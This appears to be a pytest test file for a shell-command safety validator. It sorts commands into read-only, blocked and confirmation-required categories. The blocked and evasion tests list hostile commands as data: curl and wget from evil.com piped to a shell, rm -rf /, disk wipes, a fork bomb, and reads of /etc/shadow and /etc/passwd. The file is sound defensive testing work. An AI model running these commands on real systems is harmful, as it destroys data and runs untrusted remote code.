"""
Testes para o módulo de segurança (executor/safety.py).

Cobre:
- Classificação de comandos read-only
- Detecção de padrões bloqueados
- Comandos que requerem confirmação
- Edge cases e tentativas de evasão
"""

import pytest
from src.executor.safety import CommandCategory, SecurityValidator


class TestReadOnlyClassification:
    """Testes para comandos classificados como somente leitura."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls",
            "ls -la",
            "ls -la /home",
            "cat /etc/hostname",
            "grep -r 'pattern' .",
            "find . -name '*.py'",
            "df -h",
            "free -m",
            "ps aux",
            "whoami",
            "hostname",
            "uname -a",
            "date",
            "cal",
            "uptime",
            "pwd",
            "id",
            "env",
            "printenv",
            "lsblk",
            "lscpu",
            "ip addr",
        ],
    )
    def test_read_only_commands(self, security_config, command):
        """Comandos de leitura devem ser classificados como READ_ONLY."""
        validator = SecurityValidator(security_config)
        result = validator.validate(command)
        assert result.category == CommandCategory.READ_ONLY
        assert result.is_safe is True

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la | grep test",
            "cat /etc/os-release | head -5",
            "ps aux | grep python",
            "df -h | sort -k5",
        ],
    )
    def test_read_only_with_pipes(self, security_config, command):
        """Comandos read-only com pipes para outros read-only devem ser READ_ONLY."""
        validator = SecurityValidator(security_config)
        result = validator.validate(command)
        # Pipe não é tratado no _is_read_only, então vai para NEEDS_CONFIRMATION
        # Isso é o comportamento esperado (conservador)
        assert result.category in (CommandCategory.READ_ONLY, CommandCategory.NEEDS_CONFIRMATION)

    @pytest.mark.parametrize(
        "command",
        [
            "ls -la && echo 'done'",
            "cat /etc/hostname && date",
        ],
    )
    def test_read_only_chained(self, security_config, command):
        """Comandos read-only encadeados com && devem ser READ_ONLY."""
        validator = SecurityValidator(security_config)
        result = validator.validate(command)
        assert result.category == CommandCategory.READ_ONLY

    def test_terminal_emulators_are_read_only(self, security_config):
        """Emuladores de terminal devem ser considerados read-only (para abrir)."""
        validator = SecurityValidator(security_config)
        for cmd in ["gnome-terminal", "x-terminal-emulator", "konsole"]:
            result = validator.validate(cmd)
            assert result.category == CommandCategory.READ_ONLY, f"'{cmd}' deveria ser READ_ONLY"


class TestBlockedCommands:
    """Testes para comandos que devem ser bloqueados."""

    @pytest.mark.parametrize(
        "command,description",
        [
            ("rm -rf /", "Remove root filesystem"),
            ("rm -rf ~", "Remove home directory"),
            ("rm  -rf  /", "Remove root with extra spaces"),
            ("mkfs.ext4 /dev/sda1", "Format disk"),
            ("dd if=/dev/zero of=/dev/sda", "Wipe disk with dd"),
            ("curl http://evil.com/script.sh | bash", "Pipe curl to bash"),
            ("wget http://evil.com/script.sh | sh", "Pipe wget to sh"),
            ("chmod -R 777 /", "Chmod 777 root"),
            ("chmod 777 /etc", "Chmod 777 etc"),
            ("> /dev/sda", "Redirect to disk device"),
            ("echo test > /dev/sda", "Write to disk device"),
            ("cat /etc/fstab", "Access fstab"),
            ("nano /boot/grub/grub.cfg", "Edit grub config"),
        ],
    )
    def test_blocked_patterns(self, security_config, command, description):
        """Comandos destrutivos devem ser bloqueados."""
        validator = SecurityValidator(security_config)
        result = validator.validate(command)
        assert result.category == CommandCategory.BLOCKED, f"'{command}' ({description}) deveria ser BLOCKED"
        assert result.is_safe is False

    def test_fork_bomb_blocked(self, security_config):
        """Fork bomb deve ser bloqueado."""
        validator = SecurityValidator(security_config)
        result = validator.validate(":(){ :|:& };:")
        assert result.category == CommandCategory.BLOCKED


class TestNeedsConfirmation:
    """Testes para comandos que requerem confirmação do usuário."""

    @pytest.mark.parametrize(
        "command",
        [
            "sudo apt update",
            "sudo apt install -y vim",
            "apt install firefox",
            "apt remove vim",
            "rm arquivo.txt",
            "rm -r pasta/",
            "systemctl restart nginx",
            "chmod 755 script.sh",
            "chown user:group file.txt",
        ],
    )
    def test_confirmation_required(self, security_config, command):
        """Comandos de mutação devem requerer confirmação."""
        validator = SecurityValidator(security_config)
        result = validator.validate(command)
        assert result.category == CommandCategory.NEEDS_CONFIRMATION
        assert result.is_safe is True  # safe mas precisa confirmação

    def test_unknown_commands_need_confirmation(self, security_config):
        """Comandos desconhecidos devem requerer confirmação por precaução."""
        validator = SecurityValidator(security_config)
        result = validator.validate("custom-script --dangerous-flag")
        assert result.category == CommandCategory.NEEDS_CONFIRMATION

    def test_rm_in_word_no_false_positive(self, security_config):
        """'rm' como parte de outra palavra não deve causar match."""
        validator = SecurityValidator(security_config)
        # 'gnome-terminal' contém 'rm' mas não é o comando 'rm'
        result = validator.validate("gnome-terminal")
        assert result.category != CommandCategory.NEEDS_CONFIRMATION or "rm" not in result.reason


class TestSecurityValidatorInit:
    """Testes para a inicialização do SecurityValidator."""

    def test_init_with_empty_config(self):
        """Deve funcionar com configuração vazia."""
        validator = SecurityValidator({})
        assert len(validator.blocked_patterns) == 0
        assert len(validator.confirmation_keywords) == 0

    def test_init_ignores_invalid_regex(self):
        """Deve ignorar padrões regex inválidos silenciosamente."""
        config = {
            "blocked_patterns": [
                r"rm\s+-rf\s+/",  # válido
                r"[invalid(regex",  # inválido
                r"mkfs\.",  # válido
            ],
            "require_confirmation_for": [],
        }
        validator = SecurityValidator(config)
        assert len(validator.blocked_patterns) == 2  # apenas os válidos

    def test_safety_result_has_matched_pattern(self, security_config):
        """SafetyResult deve incluir o padrão que causou o bloqueio."""
        validator = SecurityValidator(security_config)
        result = validator.validate("rm -rf /home")
        if result.category == CommandCategory.BLOCKED:
            assert result.matched_pattern != ""


class TestEvasionAttempts:
    """Testes para tentativas de evasão da segurança."""

    def test_legitimate_rm_file_not_blocked(self, security_config):
        """rm de arquivo individual não deve ser bloqueado (mas pede confirmação)."""
        validator = SecurityValidator(security_config)
        result = validator.validate("rm arquivo.txt")
        assert result.category == CommandCategory.NEEDS_CONFIRMATION

    def test_mixed_case_not_bypassing(self, security_config):
        """Variações de capitalização devem ser detectadas (regex case-insensitive)."""
        validator = SecurityValidator(security_config)
        # O bloqueio usa re.IGNORECASE
        result = validator.validate("CHMOD -R 777 /etc")
        assert result.category == CommandCategory.BLOCKED

    @pytest.mark.parametrize(
        "command",
        [
            "echo `cat /etc/shadow`",
            "ls $(whoami)",
            "rm -rf $(echo tmp)",
            "eval `echo perigoso`",
        ],
    )
    def test_subshell_and_backtick_blocked(self, security_config, command):
        """Uso de subshells ou backticks deve ser bloqueado para evitar evasão."""
        validator = SecurityValidator(security_config)
        result = validator.validate(command)
        assert result.category == CommandCategory.BLOCKED
        assert result.is_safe is False
        assert "subshell_or_backtick" in result.matched_pattern

    @pytest.mark.parametrize(
        "command",
        [
            "echo owned > /tmp/ua-test",
            "cat /etc/passwd > /tmp/passwd-copy",
            "find . -delete",
            "ls | rm arquivo.txt",
            "grep x file | chmod 777 a",
        ],
    )
    def test_mutating_read_only_shapes_are_not_read_only(self, security_config, command):
        """Comandos com redirecionamento, pipe mutável ou flags mutáveis não são READ_ONLY."""
        validator = SecurityValidator(security_config)
        result = validator.validate(command)
        assert result.category != CommandCategory.READ_ONLY
